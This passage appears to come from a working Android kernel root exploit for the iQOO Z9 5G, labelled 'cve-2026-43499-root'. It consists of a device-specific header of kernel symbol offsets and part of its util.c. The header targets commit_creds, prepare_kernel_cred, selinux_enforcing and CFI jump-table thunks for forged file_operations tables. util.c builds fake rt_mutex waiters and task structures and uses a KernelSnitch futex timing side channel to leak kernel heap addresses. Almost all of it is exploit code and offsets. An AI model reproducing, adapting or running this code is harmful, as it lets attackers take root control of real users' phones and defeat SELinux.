#define SLIDE_BANK_SLOT_STRIDE 0x100
#define SLIDE_BANK_WAITER_OFF 0x40
#define SLIDE_STACK_WRITER_MCAST 1
#define SLIDE_STACK_WRITER_SIGRETURN 2
#ifndef SLIDE_STACK_WRITER
#error iqoo-z9-5g stack writer must be set by the build
#endif
// Stack-depth convention: depth is measured down from the C syscall-entry
// SP.  A local at sp+N is at (frame depth - N), not (frame depth + N).
//
// MCAST: __arm64_sys_setsockopt(0x10) + __sys_setsockopt(0x80) +
// sock_common_setsockopt(0x40) + ipv6_setsockopt(0x40) +
// do_ipv6_setsockopt(0x60 + 0x260), with greqs at sp+0x40 = 0x390.
//
// Stale waiter: __arm64_sys_futex(0xa0) + do_futex(0x140) +
// futex_wait_requeue_pi(0x1b0), with tree_entry at sp+0x98 = 0x2f8.
// Therefore the MCAST stamp starts its fake waiter at 0x390 - 0x2f8 = 0x98.
#define MCAST_WAITER_OFF 0x98
// Fake waiter rides the FPSIMD vregs on the SVE restore path.  Its local is
// at depth __arm64_sys_rt_sigreturn(0x50) + restore_sigframe(0x50) +
// restore_sve_fpsimd_context(0x40 + 0x230) - sp_local(0x10) = 0x300.
// Align it to the same stale waiter at depth 0x2f8: 0x300 - 0x2f8 = 0x08.
#define SIGRETURN_FPSIMD_WAITER_OFF 0x08
// The grown SVE record's Z regs are copied to thread.sve_state (heap), not
// the kernel stack, so the SVE-record fake can never land on the stack; it
// is kept harmless.  The growth itself is only useful as a code-path knob.
#define SIGRETURN_SVE_WAITER_OFF 0x8
#define SIGRETURN_GROW_SVE 1
#define SIGRETURN_SVE_ZREGS_OFF 0x10
#define P0_ORACLE_GATE_SLOT 0
#define P0_ORACLE_PROBE_SLOT 1
#define P0_ORACLE_GATE_RESTORE_SLOT 2
#define P0_ORACLE_PROBE_RESTORE_SLOT 3
#define P0_ORACLE_GATE_PAGE_OFF 0x0e80
#define P0_ORACLE_GATE_OBJECT_INDEX 1
#define P0_ORACLE_PROBE_OFFSET 0x1f0000ULL
#define P0_FINGERPRINT_HEADER \
  "targets/iqoo-z9-5g/p0_fingerprint.h"
#endif

#define KERNELSNITCH_IDENTITY_START 0xffffff8000000000ULL
#define KERNELSNITCH_IDENTITY_END 0xffffff9000000000ULL
#define DIRECT_MAP_BASE 0xffffff8000000000ULL
#define DIRECT_MAP_END 0xffffff9000000000ULL
#define VMEMMAP_START 0xfffffffe00000000ULL

#define MM_DMA32_ALIAS_START 0xffffff8000000000ULL
#define MM_DMA32_ALIAS_END 0xffffff8080000000ULL
#define MM_NORMAL_ALIAS_START MM_DMA32_ALIAS_END
#define MM_NORMAL_ALIAS_END KERNELSNITCH_IDENTITY_END

#define APPENDED_FUTEXES 4096
#define REPEAT_MEASUREMENT 128
#define AVERAGE 8
#define KERNELSNITCH_BASELINE_SAMPLES 8
#define KERNELSNITCH_BASELINE_QUANTILE 1
#define S918_PAGE_SCAN_MAX 256
#define S918_KSNITCH_HINT_COLLISIONS 2
#define S918_KSNITCH_FULL_COLLISIONS 5
#define S918_DMA32_SKIP_SLABS 8
#define S918_TRIGGER_SLABS 24
#define S918_SKB_SENDS 256
#define S918_SKB_SNDBUF 8388608
#define S918_RECLAIM_SOCKET_PAIRS 32

#define TASK_STRUCT_CRED_OFF      0x798ULL
#define TASK_STRUCT_REAL_CRED_OFF 0x790ULL
#define FAKE_TASK_TASK_GROUP_OFF  0x400ULL

#define INIT_TASK_OFF             0x02d23580ULL
#define PREPARE_KERNEL_CRED_OFF   0x001a60c4ULL
#define COMMIT_CREDS_OFF          0x001a6cacULL
#define OVERRIDE_CREDS_OFF        0x001a6a34ULL
#define ROOT_TASK_GROUP_OFF       0x02e37ac0ULL
#define SELINUX_ENFORCING_OFF     0x02e89cf0ULL
#define KMALLOC_CACHES_OFF        0x021fe4c0ULL
#define ANON_PIPE_BUF_OPS_OFF     0x0201edf0ULL
#define SYSTEM_UNBOUND_WQ_OFF     0x02be07d8ULL
#define CALL_USERMODEHELPER_EXEC_WORK_OFF 0x0018a30cULL
#define CALL_USERMODEHELPER_EXEC_WORK_CFI_JT_OFF 0x0178ade0ULL

#define ASHMEM_FOPS_OFF           0x0219c2d8ULL
#define ASHMEM_MISC_FOPS_OFF      0x02d71c40ULL
#define ASHMEM_IOCTL_OFF          0x011592acULL
#define ASHMEM_COMPAT_IOCTL_OFF   0x0115995cULL
#define ASHMEM_MMAP_OFF           0x011599bcULL
#define ASHMEM_OPEN_OFF           0x01159cacULL
#define ASHMEM_RELEASE_OFF        0x01159d4cULL
#define ASHMEM_SHOW_FDINFO_OFF    0x01159e70ULL
#define CONFIGFS_READ_ITER_OFF    0x0069193cULL
#define CONFIGFS_BIN_WRITE_ITER_OFF 0x00692460ULL
#define COPY_SPLICE_READ_OFF      0x005df8c8ULL
#define NOOP_LLSEEK_OFF           0x0056cd18ULL

/* This image has Clang CFI enabled.  Function pointers stored in kernel
 * file_operations tables use the corresponding .cfi_jt thunks; pointing a
 * forged table at the direct function bodies reaches __cfi_check_fail. */
#define ASHMEM_IOCTL_CFI_JT_OFF       0x01783778ULL
#define ASHMEM_COMPAT_IOCTL_CFI_JT_OFF 0x01783780ULL
#define ASHMEM_MMAP_CFI_JT_OFF        0x01769af0ULL
#define ASHMEM_OPEN_CFI_JT_OFF        0x0177c278ULL
#define ASHMEM_RELEASE_CFI_JT_OFF     0x0177c280ULL
#define ASHMEM_SHOW_FDINFO_CFI_JT_OFF 0x01769c80ULL
#define CONFIGFS_READ_ITER_CFI_JT_OFF 0x01769890ULL
#define CONFIGFS_BIN_WRITE_ITER_CFI_JT_OFF 0x017698a8ULL
#define COPY_SPLICE_READ_CFI_JT_OFF   0x01769bf0ULL
#define NOOP_LLSEEK_CFI_JT_OFF        0x017667c8ULL

#define ASHMEM_MISC_FOPS (KIMAGE_TEXT_BASE + ASHMEM_MISC_FOPS_OFF)
#define ASHMEM_FOPS (KIMAGE_TEXT_BASE + ASHMEM_FOPS_OFF)
#define ASHMEM_IOCTL (KIMAGE_TEXT_BASE + ASHMEM_IOCTL_OFF)
#define ASHMEM_COMPAT_IOCTL (KIMAGE_TEXT_BASE + ASHMEM_COMPAT_IOCTL_OFF)
#define ASHMEM_MMAP (KIMAGE_TEXT_BASE + ASHMEM_MMAP_OFF)
#define ASHMEM_OPEN (KIMAGE_TEXT_BASE + ASHMEM_OPEN_OFF)
#define ASHMEM_RELEASE (KIMAGE_TEXT_BASE + ASHMEM_RELEASE_OFF)
#define ASHMEM_SHOW_FDINFO (KIMAGE_TEXT_BASE + ASHMEM_SHOW_FDINFO_OFF)
#define CONFIGFS_READ_ITER (KIMAGE_TEXT_BASE + CONFIGFS_READ_ITER_OFF)
#define CONFIGFS_BIN_WRITE_ITER (KIMAGE_TEXT_BASE + CONFIGFS_BIN_WRITE_ITER_OFF)
#define COPY_SPLICE_READ (KIMAGE_TEXT_BASE + COPY_SPLICE_READ_OFF)
#define NOOP_LLSEEK (KIMAGE_TEXT_BASE + NOOP_LLSEEK_OFF)
#define ASHMEM_IOCTL_CFI_JT (KIMAGE_TEXT_BASE + ASHMEM_IOCTL_CFI_JT_OFF)
#define ASHMEM_COMPAT_IOCTL_CFI_JT \
  (KIMAGE_TEXT_BASE + ASHMEM_COMPAT_IOCTL_CFI_JT_OFF)
#define ASHMEM_MMAP_CFI_JT (KIMAGE_TEXT_BASE + ASHMEM_MMAP_CFI_JT_OFF)
#define ASHMEM_OPEN_CFI_JT (KIMAGE_TEXT_BASE + ASHMEM_OPEN_CFI_JT_OFF)
#define ASHMEM_RELEASE_CFI_JT (KIMAGE_TEXT_BASE + ASHMEM_RELEASE_CFI_JT_OFF)
#define ASHMEM_SHOW_FDINFO_CFI_JT \
  (KIMAGE_TEXT_BASE + ASHMEM_SHOW_FDINFO_CFI_JT_OFF)
#define CONFIGFS_READ_ITER_CFI_JT \
  (KIMAGE_TEXT_BASE + CONFIGFS_READ_ITER_CFI_JT_OFF)
#define CONFIGFS_BIN_WRITE_ITER_CFI_JT \
  (KIMAGE_TEXT_BASE + CONFIGFS_BIN_WRITE_ITER_CFI_JT_OFF)
#define COPY_SPLICE_READ_CFI_JT \
  (KIMAGE_TEXT_BASE + COPY_SPLICE_READ_CFI_JT_OFF)
#define NOOP_LLSEEK_CFI_JT (KIMAGE_TEXT_BASE + NOOP_LLSEEK_CFI_JT_OFF)
#define INIT_TASK (KIMAGE_TEXT_BASE + INIT_TASK_OFF)
#define ROOT_TASK_GROUP (KIMAGE_TEXT_BASE + ROOT_TASK_GROUP_OFF)
#define SELINUX_ENFORCING (KIMAGE_TEXT_BASE + SELINUX_ENFORCING_OFF)
#define KMALLOC_CACHES (KIMAGE_TEXT_BASE + KMALLOC_CACHES_OFF)
#define ANON_PIPE_BUF_OPS (KIMAGE_TEXT_BASE + ANON_PIPE_BUF_OPS_OFF)
#define SYSTEM_UNBOUND_WQ (KIMAGE_TEXT_BASE + SYSTEM_UNBOUND_WQ_OFF)
#define CALL_USERMODEHELPER_EXEC_WORK (KIMAGE_TEXT_BASE + CALL_USERMODEHELPER_EXEC_WORK_OFF)
#define CALL_USERMODEHELPER_EXEC_WORK_CFI_JT \
  (KIMAGE_TEXT_BASE + CALL_USERMODEHELPER_EXEC_WORK_CFI_JT_OFF)

#define ROOT_UMH_PATH "/data/local/tmp/cve-2026-43499-root"
#define ROOT_UMH_WORK_OFF 0x6000
#define ROOT_UMH_DATA_OFF 0x6200

#define SLIDE_NFULNL_LOGGER_NAME_OFF 0x01efb7b9ULL
#define SLIDE_NFULNL_LOGGER_OBJECT_OFF 0x02be1e28ULL
#define SLIDE_RANDOM_TABLE_BOOT_ID_DATA_PTR_OFF 0x02d17280ULL
#define SLIDE_INIT_TASK_OFF INIT_TASK_OFF
#define SLIDE_ROOT_TASK_GROUP_OFF ROOT_TASK_GROUP_OFF
#define SLIDE_SYSCTL_BOOTID_OFF 0x02ea5799ULL

#define SLIDE_NFULNL_LOGGER_NAME_IMAGE \
  (KIMAGE_TEXT_BASE + SLIDE_NFULNL_LOGGER_NAME_OFF)
#define SLIDE_NFULNL_LOGGER_OBJECT_IMAGE \
  (KIMAGE_TEXT_BASE + SLIDE_NFULNL_LOGGER_OBJECT_OFF)
#define SLIDE_RANDOM_TABLE_BOOT_ID_DATA_PTR_IMAGE \
  (KIMAGE_TEXT_BASE + SLIDE_RANDOM_TABLE_BOOT_ID_DATA_PTR_OFF)
#define SLIDE_INIT_TASK_IMAGE (KIMAGE_TEXT_BASE + SLIDE_INIT_TASK_OFF)
#define SLIDE_ROOT_TASK_GROUP_IMAGE \
  (KIMAGE_TEXT_BASE + SLIDE_ROOT_TASK_GROUP_OFF)
#define SLIDE_SYSCTL_BOOTID_IMAGE \
  (KIMAGE_TEXT_BASE + SLIDE_SYSCTL_BOOTID_OFF)

#define LOCK_OFF 0x2210
#define W0_OFF 0x2350
#define FOPS_OFF 0x2000
#define SCRATCH_OFF 0x3000
#define RIGHT_OFF 0x4440
#define LEFT_OFF 0x5550
#define FAKE_TASK_OFF 0x3200

#define FAKE_WAITER_PI_TREE_ENTRY_OFF 0x18
#define FAKE_WAITER_TASK_OFF 0x30
#define FAKE_WAITER_LOCK_OFF 0x38
#define FAKE_WAITER_WAKE_STATE_OFF 0x40
#define FAKE_WAITER_PRIO_OFF 0x44
#define FAKE_WAITER_DEADLINE_OFF 0x48
#define FAKE_WAITER_WW_CTX_OFF 0x50
#define FAKE_WAITER_LAYOUT_SIZE 0x58

#define FAKE_TASK_USAGE_OFF 0x38
#define FAKE_TASK_PRIO_OFF 0x7c
#define FAKE_TASK_NORMAL_PRIO_OFF 0x84
#define FAKE_TASK_PI_LOCK_OFF 0x884
#define FAKE_TASK_PI_WAITERS_OFF 0x898
#define FAKE_TASK_PI_TOP_TASK_OFF 0x8a8
#define FAKE_TASK_PI_BLOCKED_ON_OFF 0x8b0

#define CFG_PAGE_OFF 16
#define CFG_NEEDS_READ_FILL_OFF 80
#define CFG_BIN_BUFFER_OFF 88
#define CFG_BIN_BUFFER_SIZE_OFF 96
#define CFG_CB_MAX_SIZE_OFF 100

#define WQ_DFL_PWQ_OFF 0xb0
#define PWQ_POOL_OFF 0x00
#define PWQ_WQ_OFF 0x08
#define PWQ_WORK_COLOR_OFF 0x10
#define PWQ_REFCNT_OFF 0x18
#define PWQ_NR_IN_FLIGHT_OFF 0x1c
#define PWQ_NR_ACTIVE_OFF 0x5c
#define PWQ_MAX_ACTIVE_OFF 0x60
#define POOL_WORKLIST_OFF 0x20
#define POOL_NR_IDLE_OFF 0x34

#define WORK_DATA_OFF 0x00
#define WORK_ENTRY_OFF 0x08
#define WORK_FUNC_OFF 0x18

#define STRUCT_PAGE_SIZE 0x40
#define STRUCT_PAGE_COMPOUND_HEAD_OFF 0x08
#define STRUCT_SLAB_CACHE_OFF 0x18
#define STRUCT_PAGE_TYPE_OFF 0x30

#define PIPE_BUFFER_SLOTS 32
#define PIPE_BUF_FLAG_CAN_MERGE 0x10

#define FOPS_OWNER_OFF 0x00
#define FOPS_LLSEEK_OFF 0x08
#define FOPS_READ_OFF 0x10
#define FOPS_WRITE_OFF 0x18
#define FOPS_READ_ITER_OFF 0x20
#define FOPS_WRITE_ITER_OFF 0x28
#define FOPS_IOCTL_OFF 0x50
#define FOPS_COMPAT_IOCTL_OFF 0x58
#define FOPS_MMAP_OFF 0x60
#define FOPS_OPEN_OFF 0x70
#define FOPS_RELEASE_OFF 0x80
#define FOPS_SPLICE_READ_OFF 0xc8
#define FOPS_SHOW_FDINFO_OFF 0xe0

#endif

```

---

## util.c

**Path**: `/root/s/references/iQOO-Z9_5G-vivo- research/payload/src/util.c`

```c
#include "common.h"
#include "kernelsnitch/kernelsnitch.h"

static struct kernelsnitch_shared_state *ks;
static size_t mm_objs_per_slab;
static unsigned char *skb_buf;
static int reclaim_sv[2] = {-1, -1};
#if defined(APP_CONTROLLED_MM_GROUP_RECLAIM) && \
    APP_CONTROLLED_MM_GROUP_RECLAIM
static int controlled_reclaim_sv[S918_RECLAIM_SOCKET_PAIRS - 1][2];
static size_t controlled_reclaim_count;
#endif
static struct mm_ctx prepare_ctx;
static struct mm_ctx spray_ctx;
static struct mm_ctx pre_ctx;
static struct mm_ctx post_ctx;
#if !defined(APP_CONTROLLED_MM_GROUP_RECLAIM) || \
    !APP_CONTROLLED_MM_GROUP_RECLAIM
static pid_t child_leak;
#endif

#if defined(APP_REQUIRE_FRESH_P0_SESSION) && APP_REQUIRE_FRESH_P0_SESSION
static int rmg_fast_profile_enabled(void) {
#if defined(APP_DEFAULT_FAST_KSNITCH) && APP_DEFAULT_FAST_KSNITCH
  return 1;
#else
  const char *value = getenv("RMG_FAST");
  return value && *value && strcmp(value, "0") != 0;
#endif
}

static size_t rmg_profile_env_size(const char *name, size_t fallback,
                                   size_t min, size_t max) {
  const char *value = getenv(name);
  if (!value || !*value) {
    return fallback;
  }

  char *end = NULL;
  errno = 0;
  unsigned long long parsed = strtoull(value, &end, 0);
  if (errno || end == value || *end || parsed < min || parsed > max) {
    pr_warning("ignoring invalid %s=%s\n", name, value);
    return fallback;
  }
  return (size_t)parsed;
}

static void configure_kernelsnitch_profile(
    struct kernelsnitch_shared_state *state, int payload_mode) {
  size_t appended_futexes = APPENDED_FUTEXES;
  size_t repeat_measurement = REPEAT_MEASUREMENT;
  size_t average = AVERAGE;

#if defined(APP_PAYLOAD) && APP_PAYLOAD && \
    defined(SLIDE_KSNITCH_APPENDED_FUTEXES)
  if (payload_mode == PAGE_PAYLOAD_SLIDE) {
    appended_futexes = SLIDE_KSNITCH_APPENDED_FUTEXES;
    repeat_measurement = SLIDE_KSNITCH_REPEAT_MEASUREMENT;
    average = SLIDE_KSNITCH_AVERAGE;
  }

  /*
   * Collision measurement dominates the wall time on E2S.  FAST keeps the
   * collision count, confirmation count and exact address search unchanged;
   * it only uses the shorter measurement profile already proven by the slide
   * consumer.  Explicit variables make hardware A/B testing possible without
   * producing a new payload for every sample count.
   */
  if (rmg_fast_profile_enabled()) {
    appended_futexes = SLIDE_KSNITCH_APPENDED_FUTEXES;
    if (repeat_measurement > 32) {
      repeat_measurement = 32;
    }
    if (average > 4) {
      average = 4;
    }
  }
#endif

  appended_futexes = rmg_profile_env_size(
      "RMG_KSNITCH_APPENDED", appended_futexes, 256, 4096);
  repeat_measurement = rmg_profile_env_size(
      "RMG_KSNITCH_REPEAT", repeat_measurement, 8, REPEAT_MEASUREMENT);
  average = rmg_profile_env_size(
      "RMG_KSNITCH_AVERAGE", average, 1, repeat_measurement);
  if (average > repeat_measurement) {
    average = repeat_measurement;
  }

  kernelsnitch_set_profile(state, appended_futexes, repeat_measurement,
                           average);
  pr_info("KernelSnitch profile mode=%d fast=%d appended=%zu repeat=%zu "
          "average=%zu\n",
          payload_mode, rmg_fast_profile_enabled(), appended_futexes,
          repeat_measurement, average);
}

static void log_mm_slabinfo(const char *stage) {
  if (!getenv("SLUB_DIAG")) {
    return;
  }

  FILE *fp = fopen("/proc/slabinfo", "re");
  if (!fp) {
    pr_warning("mm slabinfo stage=%s open errno=%d\n", stage, errno);
    return;
  }

  char line[512];
  int found = 0;
  while (fgets(line, sizeof(line), fp)) {
    if (strncmp(line, "mm_struct ", strlen("mm_struct ")) != 0) {
      continue;
    }
    pr_info("mm slabinfo stage=%s %s", stage, line);
    found = 1;
    break;
  }
  fclose(fp);
  if (!found) {
    pr_warning("mm slabinfo stage=%s entry missing\n", stage);
  }
}

#endif

#if defined(APP_CLOSED_SLABINFO_TOUCH) && APP_CLOSED_SLABINFO_TOUCH
static void touch_mm_slabinfo(void) {
  FILE *fp = fopen("/proc/slabinfo", "re");
  if (!fp) {
    return;
  }
  char line[512];
  unsigned long values[8];
  while (fgets(line, sizeof(line), fp)) {
    if (memcmp(line, "mm_struct ", 10)) {
      continue;
    }
    sscanf(line,
           "mm_struct %lu %lu %lu %lu %lu : tunables %*lu %*lu %*lu : slabdata %lu %lu %lu",
           &values[0], &values[1], &values[2], &values[3], &values[4],
           &values[5], &values[6], &values[7]);
    break;
  }
  fclose(fp);
}
#endif

#if defined(APP_PAYLOAD) && APP_PAYLOAD && \
    defined(SLIDE_P0_OFFSET_CANDIDATES)
static const uintptr_t slide_bank_offsets[] = {
  SLIDE_P0_OFFSET_CANDIDATES
};
static uintptr_t slide_bank_payload_base;
static uintptr_t slide_bank_parents[SLIDE_BANK_SLOTS];
static uintptr_t slide_bank_targets[SLIDE_BANK_SLOTS];

_Static_assert(
    SLIDE_BANK_TASK_OFF + (SLIDE_BANK_SLOTS - 1) * SLIDE_BANK_TASK_STRIDE +
            FAKE_TASK_PI_BLOCKED_ON_OFF + sizeof(uint64_t) <=
        SLIDE_BANK_LOCK_OFF,
    "slide task bank overlaps lock bank");
_Static_assert(
    SLIDE_BANK_LOCK_OFF + (SLIDE_BANK_SLOTS - 1) * SLIDE_BANK_SLOT_STRIDE +
            SLIDE_BANK_WAITER_OFF + FAKE_WAITER_LAYOUT_SIZE <=
        ORDER3_SIZE,
    "slide lock bank exceeds reclaimed page");
#if defined(APP_FOPS_TABLE_MIRROR_OFF)
_Static_assert(
    APP_FOPS_TABLE_MIRROR_OFF + 0x110 <= FOPS_TABLE_OFF,
    "mirrored FOPS table overlaps primary FOPS table");
#endif
#endif

uintptr_t page_base;
uintptr_t fake_lock;
uintptr_t fake_w0;
uintptr_t fake_task;
uintptr_t fake_parent;
uintptr_t fake_right;
uintptr_t fake_left;
uintptr_t fake_fops;
uintptr_t binwrite_target;
uintptr_t slide_p0_offset;
uintptr_t slide_oracle_parent;
uintptr_t slide_oracle_target;
uintptr_t p0_gate_page_struct;
uintptr_t p0_probe_page_struct;
#if defined(APP_REQUIRE_FRESH_P0_SESSION) && APP_REQUIRE_FRESH_P0_SESSION
uintptr_t fops_data_probe_addr;
int fops_data_probe_active;
int data_alias_uses_slide = 1;
#endif
int data_addr_canonical;
char ashmem_path[256] = "/dev/ashmem";

__attribute__((weak)) void app_publish_writer_started(void) {
}

__attribute__((weak)) void app_publish_slide_ready(void) {
}

void put_fake_waiter(unsigned char *payload, size_t waiter_off,
                            uintptr_t tree_parent, uintptr_t tree_right,
                            uintptr_t tree_left, uintptr_t pi_parent,
                            uintptr_t pi_right, uintptr_t pi_left,
                            uintptr_t task, uintptr_t lock,
                            uint32_t priority) {
  put64(payload, waiter_off + 0x00, tree_parent);
  put64(payload, waiter_off + 0x08, tree_right);
  put64(payload, waiter_off + 0x10, tree_left);
#if LEGACY_RT_MUTEX_WAITER || COMPACT_RT_MUTEX_WAITER
  put64(payload, waiter_off + FAKE_WAITER_PI_TREE_ENTRY_OFF + 0x00,
        pi_parent);
  put64(payload, waiter_off + FAKE_WAITER_PI_TREE_ENTRY_OFF + 0x08, pi_right);
  put64(payload, waiter_off + FAKE_WAITER_PI_TREE_ENTRY_OFF + 0x10, pi_left);
  put64(payload, waiter_off + FAKE_WAITER_TASK_OFF, task);
  put64(payload, waiter_off + FAKE_WAITER_LOCK_OFF, lock);
#if COMPACT_RT_MUTEX_WAITER
  put32(payload, waiter_off + FAKE_WAITER_WAKE_STATE_OFF, 0);
#endif
  put32(payload, waiter_off + FAKE_WAITER_PRIO_OFF, priority);
  put64(payload, waiter_off + FAKE_WAITER_DEADLINE_OFF, 0);
#if COMPACT_RT_MUTEX_WAITER
  put64(payload, waiter_off + FAKE_WAITER_WW_CTX_OFF, 0);
#endif
#else
  put32(payload, waiter_off + FAKE_WAITER_TREE_PRIO_OFF, priority);
  put64(payload, waiter_off + FAKE_WAITER_TREE_DEADLINE_OFF, 0);
  put64(payload, waiter_off + FAKE_WAITER_PI_TREE_ENTRY_OFF + 0x00,
        pi_parent);
  put64(payload, waiter_off + FAKE_WAITER_PI_TREE_ENTRY_OFF + 0x08, pi_right);
  put64(payload, waiter_off + FAKE_WAITER_PI_TREE_ENTRY_OFF + 0x10, pi_left);
  put32(payload, waiter_off + FAKE_WAITER_PI_TREE_PRIO_OFF, priority);
  put64(payload, waiter_off + FAKE_WAITER_PI_TREE_DEADLINE_OFF, 0);
  put64(payload, waiter_off + FAKE_WAITER_TASK_OFF, task);
  put64(payload, waiter_off + FAKE_WAITER_LOCK_OFF, lock);
  put32(payload, waiter_off + FAKE_WAITER_WAKE_STATE_OFF, 0);
  put64(payload, waiter_off + FAKE_WAITER_WW_CTX_OFF, 0);
#endif
}

#if defined(APP_PAYLOAD) && APP_PAYLOAD && \
    defined(SLIDE_P0_OFFSET_CANDIDATES)
int select_slide_payload_slot(uintptr_t offset) {
  if (!slide_bank_payload_base) {
    return 0;
  }
  for (size_t i = 0;
       i < sizeof(slide_bank_offsets) / sizeof(slide_bank_offsets[0]); i++) {
    if (slide_bank_offsets[i] != offset) {
      continue;
    }
#if defined(APP_PHYS_P0_ORACLE) && APP_PHYS_P0_ORACLE
    return select_slide_payload_index(1);
#else
    return select_slide_payload_index(i);
#endif
  }
  return 0;
}

int select_slide_payload_index(size_t index) {
  if (!slide_bank_payload_base || index >= SLIDE_BANK_SLOTS) {
    return 0;
  }
  fake_task = slide_bank_payload_base + SLIDE_BANK_TASK_OFF +
              index * SLIDE_BANK_TASK_STRIDE;
  fake_lock = slide_bank_payload_base + SLIDE_BANK_LOCK_OFF +
              index * SLIDE_BANK_SLOT_STRIDE;
  fake_w0 = fake_lock + SLIDE_BANK_WAITER_OFF;
  slide_oracle_parent = slide_bank_parents[index];
  slide_oracle_target = slide_bank_targets[index];
  return 1;
}

#if !defined(APP_CLOSED_FOPS_ROUTE) || !APP_CLOSED_FOPS_ROUTE
static void put_slide_bank_entry(unsigned char *p, uintptr_t payload_base,
                                 size_t slot, uintptr_t parent,
                                 uintptr_t target) {
  size_t task_off = SLIDE_BANK_TASK_OFF + slot * SLIDE_BANK_TASK_STRIDE;
  size_t lock_off = SLIDE_BANK_LOCK_OFF + slot * SLIDE_BANK_SLOT_STRIDE;
  size_t waiter_off = lock_off + SLIDE_BANK_WAITER_OFF;
  uintptr_t task = payload_base + task_off;
  uintptr_t lock = payload_base + lock_off;
  uintptr_t waiter = payload_base + waiter_off;
  uintptr_t pi_right = 0;
  uintptr_t pi_left = target;
  uintptr_t lock_owner = SLIDE_LOCK_OWNER_VALUE;
  uintptr_t waiter_task = task;
  uintptr_t task_group = 0;
  uintptr_t pi_waiters = waiter + FAKE_WAITER_PI_TREE_ENTRY_OFF;
  uintptr_t pi_top_task = task;
  uint32_t waiter_prio = SLIDE_FAKE_WAITER_PRIO;

#if defined(P0_ORACLE_PRODUCTION_SLOT)
  if (slot == P0_ORACLE_PRODUCTION_SLOT) {
#if defined(APP_PRODUCTION_SLOT_PI_RIGHT) && \
    APP_PRODUCTION_SLOT_PI_RIGHT
    pi_right = target;
    pi_left = 0;
#elif defined(APP_PRODUCTION_SLOT_PROVEN_LEFT) && \
    APP_PRODUCTION_SLOT_PROVEN_LEFT
    /* Use the child direction proven by the exact gate/probe/restore writes. */
    pi_right = 0;
    pi_left = target;
#endif
#if defined(APP_PRODUCTION_SLOT_FULL_FOPS_GEOMETRY) && \
    APP_PRODUCTION_SLOT_FULL_FOPS_GEOMETRY
    /* Match the established non-banked PAGE_PAYLOAD_FOPS construction. */
    lock_owner = task | 1;
    waiter_task = text_addr(INIT_TASK);
    task_group = text_addr(ROOT_TASK_GROUP);
    pi_waiters = 0;
    pi_top_task = text_addr(INIT_TASK);
    waiter_prio = FAKE_WAITER_PRIO;
#endif
  }
#endif

  put32(p, lock_off + 0x00, 0);
  put64(p, lock_off + 0x08, waiter);
  put64(p, lock_off + 0x10, waiter);
  put64(p, lock_off + 0x18, lock_owner);
  put_fake_waiter(p, waiter_off, 1, 0, 0, parent, pi_right, pi_left,
                  waiter_task, lock, waiter_prio);
  put32(p, task_off + FAKE_TASK_USAGE_OFF, 0x100);
  put32(p, task_off + FAKE_TASK_PRIO_OFF, FAKE_TASK_PRIO);
  put32(p, task_off + FAKE_TASK_NORMAL_PRIO_OFF, FAKE_TASK_PRIO);
  put64(p, task_off + FAKE_TASK_TASK_GROUP_OFF, task_group);
  put32(p, task_off + FAKE_TASK_PI_LOCK_OFF, 0);
  put64(p, task_off + FAKE_TASK_PI_WAITERS_OFF, pi_waiters);
  put64(p, task_off + FAKE_TASK_PI_WAITERS_OFF + 0x08, pi_waiters);
  put64(p, task_off + FAKE_TASK_PI_TOP_TASK_OFF, pi_top_task);
  put64(p, task_off + FAKE_TASK_PI_BLOCKED_ON_OFF, 0);
}
#endif
#endif

void setup_kernelsnitch(void) {
  int cpu_count = (int)sysconf(_SC_NPROCESSORS_ONLN);
#if defined(APP_REQUIRE_FRESH_P0_SESSION) && APP_REQUIRE_FRESH_P0_SESSION
  ks = kernelsnitch_setup(
      MM_STRUCT_SZ, MM_ORDER, cpu_count, KSNITCH_COLLISIONS,
      KERNELSNITCH_VERBOSE, KERNELSNITCH_MTE_ENABLED);
  configure_kernelsnitch_profile(ks, PAGE_PAYLOAD_SLIDE);
#else
  ks = kernelsnitch_setup(
      MM_STRUCT_SZ, MM_ORDER, cpu_count, KSNITCH_COLLISIONS, 0, 0);
#if defined(APP_PHYS_P0_ORACLE) && APP_PHYS_P0_ORACLE
  kernelsnitch_set_profile(
      ks, SLIDE_KSNITCH_APPENDED_FUTEXES,
      SLIDE_KSNITCH_REPEAT_MEASUREMENT,
      SLIDE_KSNITCH_AVERAGE);
#endif
#endif
}

int kernelsnitch_collisions_ready(void) {
  return kernelsnitch_found_collisions(ks);
}

void run_kernelsnitch_bruteforce(void) {
  kernelsnitch_bruteforce(ks);
}

#if defined(APP_REQUIRE_FRESH_P0_SESSION) && APP_REQUIRE_FRESH_P0_SESSION
static uintptr_t canonicalize_kernelsnitch_pointer(uintptr_t leaked) {
#if KERNELSNITCH_MTE_ENABLED
  if (leaked != (uintptr_t)-1) {
    uintptr_t tagged = leaked;
    leaked |= 0xff00000000000000ULL;
    pr_info("KernelSnitch mm_struct tagged=%016zx untagged=%016zx\n",
            tagged, leaked);
  }
#endif
  return leaked;
}
#endif

uintptr_t cleanup_kernelsnitch(void) {
  uintptr_t leaked = kernelsnitch_cleanup(ks);
  ks = NULL;
#if defined(APP_REQUIRE_FRESH_P0_SESSION) && APP_REQUIRE_FRESH_P0_SESSION
  return canonicalize_kernelsnitch_pointer(leaked);
#else
  return leaked;
#endif
}

void read_first_line(const char *path, char *buf, size_t len) {
  if (!len) {
    return;
  }
  snprintf(buf, len, "unreadable");
  int fd = open(path, O_RDONLY | O_CLOEXEC);
  if (fd < 0) {
    return;
  }
  ssize_t n = read(fd, buf, len - 1);
  int saved_errno = errno;
  close(fd);
  if (n <= 0) {
    errno = saved_errno;
    snprintf(buf, len, "unreadable");
    return;
  }
  buf[n] = 0;
  buf[strcspn(buf, "\r\n")] = 0;
}

void log_startup_context(void) {
  char attr[256];
  char enforce[32];
  char status[4096];
  char limits[160] = "NoNewPrivs=? Seccomp=? Seccomp_filters=?";
  read_first_line("/proc/self/attr/current", attr, sizeof(attr));
  read_first_line("/sys/fs/selinux/enforce", enforce, sizeof(enforce));
  int fd = open("/proc/self/status", O_RDONLY | O_CLOEXEC);
  if (fd >= 0) {
    ssize_t n = read(fd, status, sizeof(status) - 1);
    close(fd);
    if (n > 0) {
      status[n] = 0;
      const char *names[] = {"NoNewPrivs:", "Seccomp:", "Seccomp_filters:"};
      char values[3][32] = {"?", "?", "?"};
      for (size_t i = 0; i < 3; i++) {
        char *p = strstr(status, names[i]);
        if (p) {
          p += strlen(names[i]);
          while (*p == '\t' || *p == ' ') {
            p++;
          }
          size_t len = strcspn(p, "\r\n");
          if (len >= sizeof(values[i])) {
            len = sizeof(values[i]) - 1;
          }
          memcpy(values[i], p, len);
          values[i][len] = 0;
        }
      }
